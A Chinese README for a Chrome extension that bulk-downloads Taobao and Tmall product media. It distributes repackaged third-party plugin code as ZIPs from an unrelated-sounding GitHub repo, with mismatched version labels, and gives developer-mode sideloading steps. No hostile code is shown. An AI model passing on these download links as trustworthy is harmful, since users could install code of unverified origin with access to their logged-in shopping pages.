# 淘宝／天猫商品素材下载

**电商采集大师 1.2.469.1：** [下载安装 ZIP](https://github.com/chandlerler/gpt/raw/refs/heads/main/dist/ecommerce-collector-1.2.469.1.zip) · [安装说明](docs/ecommerce-collector.md)。这是单独的插件安装包，解压后加载包含 `manifest.json` 的目录。

用于整理淘宝、天猫商品图片和视频的 Chrome 扩展，支持分类下载、图片处理、批量任务和商品笔记。

本仓库收录并整理来自网络的插件代码及安装文件，原插件及相关组件的版权归原作者所有。本说明以当前仓库版本 **3.8.7.1** 为准。

**原插件链接：** [Taobao Tmall Image Video — Chrome 应用商店](https://chromewebstore.google.com/detail/taobao-tmall-image-video/amajhcihapocjmencaehfanmjibfgihh?pli=1)

## 功能介绍

| 功能 | 说明 |
|---|---|
| 商品素材采集 | 读取商品主图、SKU 款式图、详情图及可下载的视频 |
| 分类预览 | 按素材类型展示，可放大查看、勾选或取消选择 |
| 自动滚动扫描 | 通过滚动页面加载详情图片，并持续收集素材 |
| 增量补抓 | 展开详情、切换款式或播放视频后，补充新加载的素材 |
| 图片筛选 | 按最小宽度、高度和文件格式筛选 |
| 分类打包 | 将素材按类别保存到 ZIP，并生成来源与文件清单 |
| 图片处理 | 生成 JPG／PNG 副本，支持缩放、白底方形、详情长图切段及容量控制 |
| 批量下载 | 将当前窗口已打开的商品标签页加入队列，按顺序处理 |
| 失败重试 | 查看失败项目，单独重试或重新扫描商品 |
| 商品笔记 | 记录商品名称、店铺、采购状态、备注和自定义 SKU 对照 |
| 数据导出 | 导出商品笔记 JSON 和款式对照 CSV |
| 多语言 | 支持简体中文、繁体中文和英文 |

## 支持范围

- **淘宝、天猫：** 支持桌面端商品详情页。
- **天猫国际：** 使用前需按提示允许访问对应站点。
- 批量处理以当前窗口中已经打开的商品标签页为来源。
- 图片和视频的可获取范围取决于商品页面实际提供的资源。

## 安装方法

需要桌面版 **Chrome 114 或更新版本**，安装时无需编译或安装项目依赖。

1. [下载仓库 ZIP](https://github.com/chandlerler/gpt/archive/refs/heads/main.zip)，或在仓库页面点击 **Code → Download ZIP**。
2. 解压到一个准备长期保留的文件夹。
3. 在 Chrome 地址栏输入 `chrome://extensions`。
4. 开启右上角的「开发者模式」。
5. 点击「加载已解压的扩展程序」。
6. 选择解压目录中的 **`extension` 文件夹**，该文件夹内应直接包含 `manifest.json`。
7. 在浏览器扩展菜单中找到插件，可将其固定到工具栏。

也可以下载仓库 [dist 目录](https://github.com/chandlerler/gpt/tree/main/dist) 中的插件安装 ZIP，解压后加载直接包含 `manifest.json` 的文件夹。

> ZIP 需要先解压。通过仓库安装时，应选择 `extension` 文件夹，而不是整个仓库根目录。

## 使用方法

### 下载单个商品

1. 打开淘宝或天猫商品详情页，等待页面正常显示；需要登录时先完成登录。
2. 点击插件图标，打开侧栏。
3. 点击「扫描商品」，等待扫描结束。
4. 在主图、款式图、详情图和视频分类中选择需要的素材。
5. 按需设置图片输出选项，然后点击下载。
6. 在 Chrome 下载列表中查看文件，解压 ZIP 检查内容。

扫描过程中可手动停止。停止或达到扫描时间上限时，已有结果可能不完整。

### 补充遗漏素材

如果部分详情图或视频没有出现，先回到原商品页，展开相关内容、切换款式或播放视频。等待素材加载后，在插件中使用补抓功能，再查看新增结果。

补抓适用于同一商品、同一份已加载页面。刷新页面或切换到其他商品后，应重新扫描。

### 批量下载多个商品

1. 在同一个 Chrome 窗口中打开多个商品详情页。
2. 在侧栏进入「批量下载」。
3. 选择需要下载的素材分类和输出设置。
4. 加入当前商品或当前窗口已打开的商品。
5. 开始处理，查看各商品的结果。

队列最多保存 **30 个商品任务**，每个商品分别生成下载结果。处理期间请保持商品标签页和侧栏打开，出现失败时可以重试失败项目。

### 设置图片输出

默认可保存素材原文件，也可以额外生成用于整理或上架的图片副本：

- **格式：** JPG 或 PNG。
- **尺寸：** 等比例缩小到指定范围，不放大原图。
- **白底方形：** 将主图或款式图居中并补白，保留图片主体。
- **详情图切段：** 将长图从上到下分成多张图片。
- **容量控制：** 按所选文件大小调整画质或尺寸。

生成副本时会保留原文件。动画图片的副本为静态首帧；转换失败时会提示原因，并保留已经取得的原档。

### 保存商品笔记

完成商品扫描后，在「商品笔记」中使用当前商品创建笔记，填写商品名称、店铺信息、采购状态和备注。可记录自己的 SKU 编号与款式名称，核对图片对应关系后保存，或导出 JSON 与 CSV。

最多保存 **100 则笔记**。笔记保存在当前浏览器的本地存储中；导出的笔记不包含图片或视频，媒体文件需另外下载。

## 下载文件结构

常见的商品 ZIP 内容如下；没有素材的分类不会生成空文件夹：

```text
商品ID_商品标题.zip
├── 主圖/
├── SKU款式圖/
├── 詳情圖/
├── 影片/
├── 上架副本/
├── 商品來源.txt
├── 素材清單.csv
└── 素材清單.json
```

款式图文件名可包含款式名称。CSV 可用表格软件查看，JSON 用于保存结构化来源信息。

部分页面临时视频由商品页单独触发下载，不在 ZIP 中。清单中的素材地址会省略查询参数，主要用于追溯来源，不保证能直接重新下载。

## 常见问题

### 为什么扫描不到图片？

确认当前页面是商品详情页，而不是首页或搜索结果页。等待页面加载，必要时先登录、展开详情，再重新扫描。平台页面结构发生变化也可能影响识别。

### 为什么视频播放正常却无法下载？

部分视频采用分片流或临时播放地址，无法直接作为完整文件读取。可以先播放视频后补抓，但不保证所有播放器中的视频都能保存。

### 是否支持整店采集？

批量功能处理已打开的商品标签页，不会自动遍历店铺或翻页搜索结果。当前版本不支持 1688 新商品采集。

### 为什么有些素材没有默认选中？

疑似空白图、过小图片或指向其他商品的推广图可能被过滤或默认取消选择。可以检查预览结果，再自行决定是否下载。

### 显示下载完成后，在哪里找文件？

查看 Chrome 下载列表和浏览器设置的下载目录。插件中的完成状态表示已将文件交给浏览器保存，最终以下载列表和实际文件为准。

### 如何更新？

下载仓库的新版本，更新原加载目录内的文件，然后在 `chrome://extensions` 中点击该扩展的「重新加载」。建议保持目录路径不变；更新或卸载前先导出重要笔记。

## 使用提示

- 单次扫描最多约 **60 秒**，详情内容较多时可结合补抓使用。
- 批量任务需要原商品页面保持可访问；标签页关闭或刷新后可能需要重新扫描。
- 图片处理设有尺寸、分段和内存保护，过大的文件可能只保留原档。
- 网站改版、登录状态、网络条件和资源访问限制都可能影响采集结果。
- 当前已完成核心逻辑和使用模拟 Chrome 接口的浏览器流程检查；真实扩展安装及线上商品兼容性尚未完成全面验证。
